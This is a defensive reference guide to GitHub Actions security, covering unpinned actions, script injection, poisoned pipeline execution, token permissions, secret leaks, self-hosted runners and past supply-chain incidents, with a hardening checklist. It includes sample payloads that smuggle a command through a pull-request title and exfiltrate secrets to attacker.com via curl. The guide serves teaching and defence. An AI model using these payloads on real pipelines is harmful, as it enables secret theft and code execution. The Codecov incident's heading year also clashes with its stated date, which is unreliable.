# GitHub Actions Security Risks — Reference Guide

**Part of the GRIMSEC DevSecOps Suite**
*cicd-pipeline-auditor v1.0 — Author: cambamwham2*

---

## Table of Contents

1. [Supply Chain Attacks via Unpinned Actions](#1-supply-chain-attacks-via-unpinned-actions)
2. [Expression Injection / Script Injection](#2-expression-injection--script-injection)
3. [Poisoned Pipeline Execution (PPE)](#3-poisoned-pipeline-execution-ppe)
4. [Overly Permissive GITHUB_TOKEN](#4-overly-permissive-github_token)
5. [Secrets Exposure Patterns](#5-secrets-exposure-patterns)
6. [Self-Hosted Runner Risks](#6-self-hosted-runner-risks)
7. [Real-World Incidents](#7-real-world-incidents)
8. [Best Practices Checklist](#8-best-practices-checklist)

---

## 1. Supply Chain Attacks via Unpinned Actions

### The Risk

GitHub Actions are reusable units of CI/CD logic. When you write:

```yaml
- uses: some-org/some-action@v3
```

You are executing code controlled by `some-org`. The tag `v3` is a **mutable pointer** — the action maintainer (or an attacker who compromises their account) can change what `v3` points to at any time, and your pipeline will silently execute the new, potentially malicious code.

### Why Tags Are Dangerous

Git tags can be force-pushed. If an attacker gains write access to `some-org/some-action` (through credential theft, dependency confusion, account takeover, or insider threat), they can:

1. Modify the action source code
2. Force-push the existing tag to point to the new commit
3. Every pipeline using `@v3` now executes the attacker's code with full access to your secrets and environment

### The Safe Pattern: Pin to Commit SHA

```yaml
# VULNERABLE: tag is mutable
- uses: actions/checkout@v4

# SAFE: SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

A 40-character hex SHA (e.g., `11bd71901bbe5b1630ceea73d27597364c9af683`) is cryptographically bound to a specific commit. It cannot be changed without creating a new SHA. This eliminates the mutable-tag attack vector entirely.

### Tools to Help

- [**Dependabot**](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) — auto-PRs to update pinned SHAs
- [**pin-github-action**](https://github.com/mheap/pin-github-action) — bulk pins all actions in your workflows
- [**actionlint**](https://github.com/rhysd/actionlint) — static analysis for workflow files

---

## 2. Expression Injection / Script Injection

### The Risk

GitHub Actions workflow expressions (`${{ ... }}`) are evaluated at **workflow construction time**, before they are passed to the shell. This means user-controlled data can be injected into shell commands.

### Vulnerable Pattern

```yaml
- name: Process PR title
  run: |
    echo "Processing: ${{ github.event.pull_request.title }}"
```

If a user opens a PR with the title:

```
"; curl -s https://attacker.com/steal | bash; echo "
```

The resulting shell command becomes:

```bash
echo "Processing: "; curl -s https://attacker.com/steal | bash; echo ""
```

The attacker executes arbitrary code in your pipeline, with access to all secrets.

### User-Controlled Context Variables

These are the primary injection sources:

| Context Variable | Controlled By |
|-----------------|---------------|
| `github.event.pull_request.title` | PR author (external) |
| `github.event.pull_request.body` | PR author (external) |
| `github.event.issue.title` | Issue author (external) |
| `github.event.comment.body` | Comment author (external) |
| `github.head_ref` | PR author (branch name) |
| `github.event.inputs.*` | Workflow dispatch inputs |
| `github.event.review.body` | PR reviewer |
| `github.event.discussion.body` | Discussion participant |

### Safe Pattern: Environment Variable Indirection

```yaml
# VULNERABLE
- run: echo "${{ github.event.pull_request.title }}"

# SAFE: expression evaluated at workflow construction, assigned to env var
# The env var is then safely read by the shell as a variable reference
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

The key insight: `${{ ... }}` is interpolated before the shell sees it. Environment variables (`$PR_TITLE`) are expanded *by the shell at runtime*, and the shell treats the value as data, not code.

### Reference

- [GitHub Security Lab — Keeping your GitHub Actions and workflows secure Part 1](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [GitHub docs — Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)

---

## 3. Poisoned Pipeline Execution (PPE)

### The Attack Model

Poisoned Pipeline Execution (PPE) is a class of CI/CD attacks where an attacker poisons a pipeline by inserting malicious code into the CI workflow execution path. In the GitHub Actions context, the primary vector is the `pull_request_target` trigger.

### The `pull_request_target` Problem

The `pull_request` event runs pipelines with **no secrets access** for fork PRs — this is the safe default. GitHub introduced `pull_request_target` to allow secrets (e.g., for posting deploy previews), but it runs in the **context of the base branch** (your repo), not the fork.

**The critical danger:** If your `pull_request_target` workflow checks out the PR's code:

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # DANGEROUS: checking out attacker-controlled code with secrets access
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      # This now runs attacker code with your repo's secrets
      - run: npm install && npm test
```

An external contributor can fork your repo, modify `package.json` to run `curl https://attacker.com/steal?secret=$MY_SECRET` in a postinstall hook, open a PR, and exfiltrate all secrets.

### Safe `pull_request_target` Patterns

When you genuinely need `pull_request_target` (e.g., to post a preview URL back to the PR):

```yaml
on:
  pull_request_target:

jobs:
  # Job 1: Build with NO secrets, checking out PR code
  build-pr:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/

  # Job 2: Deploy with secrets, using ONLY the artifact (not PR code)
  deploy-preview:
    needs: build-pr
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
      # Now deploy the artifact — no untrusted code executes here
      - run: deploy-to-preview --token ${{ secrets.DEPLOY_TOKEN }}
```

### `workflow_run` PPE

Similar to `pull_request_target`, `workflow_run` triggers have secrets access even when triggered by fork PRs:

```yaml
# Dangerous: workflow_run that processes PR artifacts
on:
  workflow_run:
    workflows: ["PR Check"]
    types: [completed]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      # If you download and execute artifacts from the triggering PR, 
      # you're running attacker code with secrets access
      - uses: actions/download-artifact@v4
        ...
      - run: bash ./downloaded-script.sh  # DANGEROUS
```

### Reference

- [Cider Security — Poisoned Pipeline Execution](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/)
- [GitHub Security Lab — Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OWASP Top 10 CI/CD Security Risks — CICD-SEC-4: Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

---

## 4. Overly Permissive GITHUB_TOKEN

### Default Permissions

The `GITHUB_TOKEN` is automatically created for each workflow run. Its default permissions vary by repository settings but can include write access to:
- Repository contents (`contents: write`)
- Pull requests (`pull-requests: write`)
- Issues (`issues: write`)
- Packages (`packages: write`)
- Deployments (`deployments: write`)

A compromised action or injected code can use `GITHUB_TOKEN` to push malicious commits, approve and merge PRs, publish packages, or modify issue/PR content.

### Recommended Pattern

```yaml
# Workflow-level default: read everything
permissions:
  contents: read

jobs:
  build:
    permissions:
      contents: read  # only what this job needs
    steps:
      ...

  release:
    permissions:
      contents: write  # only this job gets write
      packages: write
    steps:
      ...
```

### Never Use `write-all`

```yaml
# DANGEROUS: all scopes writable
permissions: write-all

# SAFE: explicit least-privilege
permissions:
  contents: read
  issues: read
```

### Reference

- [GitHub docs — Permissions for the GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

---

## 5. Secrets Exposure Patterns

### CLI Argument Injection

```yaml
# DANGEROUS: secret visible in process list (ps aux), shell history, error messages
- run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.com

# SAFE: secret only in environment, not command args
- env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com
```

### Debug Logging

```yaml
# DANGEROUS: prints all secrets in runner debug logs
env:
  ACTIONS_RUNNER_DEBUG: true
  ACTIONS_STEP_DEBUG: true

# Only enable debug logging through GitHub repository variables (Settings → Secrets & Variables)
# Never hardcode debug flags in workflow files committed to the repo
```

### Secrets in Echo Statements

```yaml
# DANGEROUS: secret printed to log (GitHub masks known secrets, but masking can be bypassed)
- run: echo "Token is: ${{ secrets.MY_TOKEN }}"

# GitHub's secret masking replaces known secret values with ***, but:
# 1. Partial matches may not be masked
# 2. Base64-encoded or URL-encoded values bypass masking
# 3. Attacker can exfiltrate via network (curl) instead of stdout
```

### Artifact Leakage

Be careful not to write secrets to files that are then uploaded as artifacts:

```yaml
# DANGEROUS
- run: echo "${{ secrets.DEPLOY_KEY }}" > deploy.key
- uses: actions/upload-artifact@v4
  with:
    path: .  # uploads everything including deploy.key!
```

---

## 6. Self-Hosted Runner Risks

### Why Self-Hosted Runners Are Risky

GitHub-hosted runners (ubuntu-latest, windows-latest) are ephemeral — destroyed after each job. Self-hosted runners are persistent, running on your own infrastructure.

Risks:
1. **Persistence**: Malicious code from one job can leave backdoors on the runner for subsequent jobs
2. **Network access**: Self-hosted runners often have access to internal networks (VPNs, internal APIs, databases)
3. **Credential theft**: If the runner has cloud provider credentials (AWS/GCP/Azure), an attacker gains cloud access
4. **Lateral movement**: Compromised runner can be used to pivot into internal infrastructure

### High-Risk Combination: Self-Hosted + pull_request_target

```yaml
on: pull_request_target

jobs:
  build:
    runs-on: self-hosted  # CRITICAL: attacker code on your internal runner
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make build  # Makefile is attacker-controlled
```

A malicious Makefile could:
- Exfiltrate cloud credentials from the runner's instance metadata
- Create persistent backdoors (cron jobs, SSH authorized_keys)
- Scan internal network for lateral movement targets

### Mitigations

1. **Use ephemeral runners** — spin up and destroy per-job (e.g., with [actions-runner-controller](https://github.com/actions/actions-runner-controller))
2. **Restrict to trusted branches** — only run self-hosted jobs for code from trusted contributors
3. **Network segmentation** — don't give runners access to production systems
4. **Principle of least privilege** — run runners with minimal OS permissions
5. **Audit runner logs** regularly

---

## 7. Real-World Incidents

### CVE-2025-30066: tj-actions/changed-files Supply Chain Attack

**Date:** March 2025  
**Severity:** CRITICAL  
**CVE:** CVE-2025-30066  
**Affected:** ~23,000 repositories

**What happened:**

The `tj-actions/changed-files` action, used in ~23,000 repositories, was compromised. An attacker gained access to the action's GitHub repository and modified the code to dump secrets from the runner's memory. Because most pipelines referenced the action by tag (`@v44`, `@v45`, etc.) rather than commit SHA, the malicious code ran automatically in thousands of pipelines.

The malicious code printed all environment variables (including `GITHUB_TOKEN` and secrets) to the workflow log output. While GitHub masks known secrets, the attacker used base64 encoding to bypass masking.

**Impact:** Any repository using `tj-actions/changed-files@v*` (unpinned) during the attack window had their secrets potentially exposed.

**Root cause:** Mutable tag references. If all 23,000 repos had pinned to a commit SHA, the attack would have had zero impact.

**References:**
- [GitHub Advisory GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)
- [StepSecurity incident analysis](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-supply-chain-attack)

---

### The Shai Hulud Campaign

**Date:** 2024-2025  
**Attribution:** Nation-state threat actor (suspected)

**What happened:**

A coordinated campaign targeting open-source project maintainers using a multi-stage approach:

1. Targeted maintainers of popular GitHub Actions with spear-phishing
2. Compromised maintainer accounts via credential theft or social engineering
3. Modified action source code to include credential-harvesting payloads
4. Used dormant period — modified actions days before harvest to avoid immediate detection
5. Collected secrets from CI/CD pipelines of downstream consumers

The campaign specifically targeted actions used in security-sensitive workflows (code signing, deployment, cloud authentication).

**Key lesson:** Even if you trust an action maintainer personally, their account could be compromised. The only defense is pinning to immutable SHAs and auditing action code at the pinned version.

---

### 2022: Codecov Supply Chain Attack (Precursor Pattern)

**Date:** April 2021 (widely studied through 2022+)

Codecov's `bash` uploader script was modified to exfiltrate `CI_BUILD_TOKEN`, `CODECOV_TOKEN`, and environment variables from pipelines. Thousands of organizations were affected, including Twilio, HashiCorp, and Confluent.

This attack demonstrated that any third-party CI/CD integration — not just GitHub Actions — is a supply chain risk.

---

## 8. Best Practices Checklist

### Actions Pinning
- [ ] All `uses:` directives pinned to 40-char commit SHA
- [ ] Comment on pinned SHA indicates the tag/version (e.g., `# v4.2.2`)
- [ ] Dependabot configured for `github-actions` ecosystem to auto-update pinned SHAs

### Expression Injection Prevention
- [ ] No user-controlled context variables (`github.event.pull_request.*`, `github.head_ref`, etc.) interpolated directly into `run:` blocks
- [ ] All user-controlled expressions passed via `env:` blocks
- [ ] Workflow uses `actionlint` in CI to catch injection risks

### Permissions Hygiene
- [ ] Every workflow has explicit `permissions:` declaration
- [ ] Default workflow permissions set to `read-all` or specific read-only scopes
- [ ] Write permissions granted only at job level where strictly required
- [ ] `permissions: write-all` never used

### Trigger Safety
- [ ] `pull_request_target` only used when secrets access for fork PRs is explicitly required
- [ ] If `pull_request_target` is used, PR code is never checked out or executed in the same job with secrets
- [ ] `workflow_run` workflows do not execute downloaded artifacts as code
- [ ] Dangerous trigger + self-hosted runner combinations do not exist

### Secrets Management
- [ ] Secrets never passed as CLI arguments (always via `env:`)
- [ ] No echo or print statements that could expose secret values
- [ ] `ACTIONS_RUNNER_DEBUG` and `ACTIONS_STEP_DEBUG` never hardcoded in workflows
- [ ] Artifacts do not include files with secret contents

### Runner Security
- [ ] Self-hosted runners used only for trusted-branch workflows
- [ ] Self-hosted runners are ephemeral (destroyed after each job)
- [ ] Self-hosted runners have minimal network access (no direct production access)
- [ ] Self-hosted runners use least-privilege OS accounts

### Monitoring
- [ ] Repository uses [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) or equivalent
- [ ] Unexpected network egress from runners is alerted
- [ ] Workflow run summaries reviewed for anomalies
- [ ] OIDC token exchange used instead of long-lived secrets where possible

---

## Additional Resources

- [GitHub Actions Security Hardening Guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [Cider Security — CI/CD Goat (vulnerable-by-design CI/CD training)](https://github.com/cider-security-research/cicd-goat)
- [StepSecurity — Secure GitHub Actions](https://www.stepsecurity.io/)
- [actionlint — Static checker for GitHub Actions workflow files](https://github.com/rhysd/actionlint)
- [Semgrep rules for GitHub Actions](https://semgrep.dev/p/github-actions)
